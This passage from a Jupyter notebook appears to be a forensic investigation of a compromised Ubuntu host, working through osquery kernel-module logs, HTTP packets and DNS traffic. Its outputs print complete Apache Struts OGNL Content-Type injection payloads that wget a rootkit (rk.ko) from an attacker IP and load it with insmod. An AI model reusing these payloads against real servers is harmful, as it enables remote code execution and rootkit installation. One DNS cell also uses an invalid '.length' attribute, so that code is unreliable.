       "46  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "\n",
       "    epoch  counter action                 decorations.host_uuid  \\\n",
       "42      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "43      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "44      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "45      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "46      0        0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "   decorations.username            columns.name  ... columns.md5  \\\n",
       "42                  NaN                      rk  ...         NaN   \n",
       "43                  NaN          ipt_MASQUERADE  ...         NaN   \n",
       "44                  NaN  nf_nat_masquerade_ipv4  ...         NaN   \n",
       "45                  NaN    nf_conntrack_netlink  ...         NaN   \n",
       "46                  NaN               nfnetlink  ...         NaN   \n",
       "\n",
       "    columns.mode columns.mtime  columns.sha1  columns.sha256  columns.size  \\\n",
       "42           NaN           NaN           NaN             NaN           NaN   \n",
       "43           NaN           NaN           NaN             NaN           NaN   \n",
       "44           NaN           NaN           NaN             NaN           NaN   \n",
       "45           NaN           NaN           NaN             NaN           NaN   \n",
       "46           NaN           NaN           NaN             NaN           NaN   \n",
       "\n",
       "    columns.target_path columns.time  columns.transaction_id  columns.uid  \n",
       "42                  NaN          NaN                     NaN          NaN  \n",
       "43                  NaN          NaN                     NaN          NaN  \n",
       "44                  NaN          NaN                     NaN          NaN  \n",
       "45                  NaN          NaN                     NaN          NaN  \n",
       "46                  NaN          NaN                     NaN          NaN  \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslog_kernel.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['rk', 'ipt_MASQUERADE', 'nf_nat_masquerade_ipv4',\n",
       "       'nf_conntrack_netlink', 'nfnetlink', 'xfrm_user', 'xfrm_algo',\n",
       "       'iptable_nat', 'nf_conntrack_ipv4', 'nf_defrag_ipv4',\n",
       "       'nf_nat_ipv4', 'xt_addrtype', 'iptable_filter', 'ip_tables',\n",
       "       'xt_conntrack', 'x_tables', 'nf_nat', 'nf_conntrack',\n",
       "       'br_netfilter', 'bridge', 'stp', 'llc', 'overlay', 'ppdev',\n",
       "       'intel_powerclamp', 'crct10dif_pclmul', 'crc32_pclmul',\n",
       "       'ghash_clmulni_intel', 'aesni_intel', 'aes_x86_64', 'lrw',\n",
       "       'vboxvideo', 'gf128mul', 'glue_helper', 'ablk_helper', 'cryptd',\n",
       "       'ttm', 'drm_kms_helper', 'snd_intel8x0', 'snd_ac97_codec',\n",
       "       'ac97_bus', 'input_leds', 'joydev', 'serio_raw', 'snd_pcm', 'drm',\n",
       "       'fb_sys_fops', 'snd_timer', 'syscopyarea', 'sysfillrect',\n",
       "       'i2c_piix4', 'snd', 'sysimgblt', 'soundcore', 'vboxguest',\n",
       "       '8250_fintek', 'parport_pc', 'parport', 'mac_hid', 'autofs4',\n",
       "       'hid_generic', 'usbhid', 'hid', 'psmouse', 'ahci', 'libahci',\n",
       "       'e1000', 'pata_acpi', 'fjes', 'video', 'xt_nat', 'xt_tcpudp',\n",
       "       'veth', 'floppy', 'xor', 'raid6_pq', 'ufs', 'qnx4', 'hfsplus',\n",
       "       'hfs', 'minix', 'ntfs', 'msdos', 'jfs', 'xfs', 'libcrc32c',\n",
       "       'btrfs', 'nfnetlink_queue', 'nfnetlink_log', 'bluetooth'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslog_kernel[(oslog_kernel.action == 'added') | (oslog_kernel.action=='removed')]['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'wget' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**From the content types we can find that rk.ko is downloaded through wget command.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'insmod' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**rk.ko is inserted into the kernel through insmod command.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "paths = oslog['columns.target_path'].unique()\n",
    "file_hostname = []\n",
    "\n",
    "for path in paths:\n",
    "    if isinstance(path, float):\n",
    "        continue\n",
    "    if 'host' in path:\n",
    "        file_hostname.append(path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\\\\/etc\\\\/dbus-1\\\\/system.d\\\\/org.freedesktop.hostname1.conf.dpkg-new',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swp',\n",
       " '\\\\/root\\\\/.ssh\\\\/.known_hosts.swpx',\n",
       " '\\\\/root\\\\/.ssh\\\\/known_hosts~']"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_hostname"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**The file name that contains the internal hostnames is known_hosts. It is a file under path /root/.ssh**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'known_hosts' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**As there is no known_hosts appearing in the content type, there is no evidence that  that the attacker extracted the internal host names via HTTP in the logs.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### DNS Traffic Analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
     ]
    }
   ],
   "source": [
    "http_cmd = 0\n",
    "\n",
    "for pck in http:\n",
    "    try:\n",
    "        content_type = pck.http.Content_type\n",
    "        if 'wget' in content_type:\n",
    "            print(content_type)\n",
    "    \n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dns = pd.read_csv('dns_df.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dns_query = df_dns[df_dns['port'] == 53]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['162.212.156.148', '75.75.75.75'], dtype=object)"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_dns_query['ip_src'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**There are two DNS servers, 162.212.156.148 and 75.75.75.75. 162.212.156.148 is the attacker-controlled one because it stores the wget .ko file.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "controlled = df_dns[df_dns['ip_dst'] == '162.212.156.148'].length\n",
    "legitimate = df_dns[df_dns['ip_dst'] == '75.75.75.75'].length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(10, 8))\n",
    "bins = np.linspace(80, 1200, 20)\n",
    "\n",
    "plt.hist(controlled, bins, alpha=0.5, label='controlled')\n",
    "plt.hist(legitimate, bins, alpha=0.5, label='legitimate')\n",
    "plt.legend(loc='upper right')\n",
    "plt.title('Distribution of the length of DNS queries to the two DNS servers')\n",
    "plt.ylabel('Frequency')\n",
    "plt.xlabel('DNS query length')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
